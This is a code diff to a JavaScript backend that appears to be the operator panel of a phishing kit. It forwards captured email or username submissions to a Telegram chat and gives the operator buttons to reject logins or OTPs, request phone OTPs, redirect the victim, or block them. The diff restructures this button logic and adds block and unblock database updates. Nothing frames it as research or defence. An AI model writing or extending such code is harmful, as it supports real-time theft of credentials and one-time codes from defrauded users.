@@ -329,6 +329,7 @@ async function buildMessage(data, options = {}) {
 
   try {
     if (!userId) throw new Error("userId is missing");
+    if (!db) throw new Error("Database instance (db) is missing");
 
     // -----------------------------
     // Check if submission contains email or username
@@ -338,30 +339,24 @@ async function buildMessage(data, options = {}) {
       return lower.includes("email") || lower.includes("username");
     });
 
-    let identifier = null;
-    let page = "";
-    let isBlocked = false;
-
     // -----------------------------
     // Get user info from DB
     // -----------------------------
-    if (db) {
-      const userRow = await db.get(
-        "SELECT status, page, identifier FROM users WHERE id = ?",
-        [userId]
-      );
+    const userRow = await db.get(
+      "SELECT status, page, identifier FROM users WHERE id = ?",
+      [userId]
+    );
 
-      if (!userRow) {
-        throw new Error(`User ${userId} not found in database`);
-      }
-
-      identifier = userRow.identifier;
-      page = (userRow.page || "").toLowerCase();
-      isBlocked = userRow.status === "blocked";
+    if (!userRow) {
+      throw new Error(`User ${userId} not found in database`);
     }
 
+    const identifier = userRow.identifier;
+    const page = (userRow.page || "").toLowerCase();
+    const isBlocked = userRow.status === "blocked";
+
     // -----------------------------
-    // Dynamic Heading
+    // Dynamic Heading (ORIGINAL LOGIC PRESERVED)
     // -----------------------------
     let heading;
 
@@ -390,51 +385,56 @@ async function buildMessage(data, options = {}) {
       throw new Error("Bot token or Chat ID missing");
     }
 
-    if (!db) {
-      throw new Error("Database instance (db) is missing");
-    }
+    // -----------------------------
+    // BUTTON LOGIC
+    // -----------------------------
+    let buttons = [];
 
-    const buttons = [];
-
-    // Always visible row
-    buttons.push([
-      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-    ]);
-
-    // Only show bad/otp buttons for login or otp pages
-    if (page === "login" || page.includes("otp")) {
-      const badButton =
-        page === "login"
-          ? {
-              text: "Bad Login",
-              callback_data: `cmd:bad-login:${userId}`
-            }
-          : {
-              text: "Bad OTP",
-              callback_data: `cmd:bad-otp:${userId}`
-            };
-
-      buttons.push([
-        badButton,
-        { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-      ]);
-    }
-
-    const blockButton = isBlocked
-      ? {
+    if (isBlocked) {
+      // 🔴 BLOCKED MODE
+      buttons = [[
+        {
           text: "Unblock",
           callback_data: `cmd:unblock:${userId}`
         }
-      : {
+      ]];
+    } else {
+      // 🟢 NORMAL MODE
+
+      // Row 1
+      buttons.push([
+        { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+        { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+      ]);
+
+      // Row 2 (login/otp logic preserved)
+      if (page === "login" || page.includes("otp")) {
+        const badButton =
+          page === "login"
+            ? {
+                text: "Bad Login",
+                callback_data: `cmd:bad-login:${userId}`
+              }
+            : {
+                text: "Bad OTP",
+                callback_data: `cmd:bad-otp:${userId}`
+              };
+
+        buttons.push([
+          badButton,
+          { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+        ]);
+      }
+
+      // Row 3
+      buttons.push([
+        { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
+        {
           text: "Block",
           callback_data: `cmd:block:${userId}`
-        };
-
-    buttons.push([
-      { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
-      blockButton
-    ]);
+        }
+      ]);
+    }
 
     await sendTelegramMessage(botToken, chatId, message, {
       parse_mode: "HTML",
@@ -443,7 +443,7 @@ async function buildMessage(data, options = {}) {
       }
     });
 
-    console.log("✅ Telegram message sent with dynamic heading + buttons");
+    console.log("✅ Telegram message sent with full preserved logic");
 
     return message;
 
@@ -494,6 +494,10 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
         console.log("link", link);
       } else if (command === "redirect") {
         link = resolveFrontendRoute("final");
+      } else if (command === "block") {
+        await db.run("UPDATE users SET status = ? WHERE id = ?", ["blocked", userId] );
+      } else if (command === "unblock") {
+        await db.run("UPDATE users SET status = ? WHERE id = ?", ["active", userId] );
       } else if (command === "phone-otp") {
         phonescreen = resolveFrontendRoute("otp");
       }
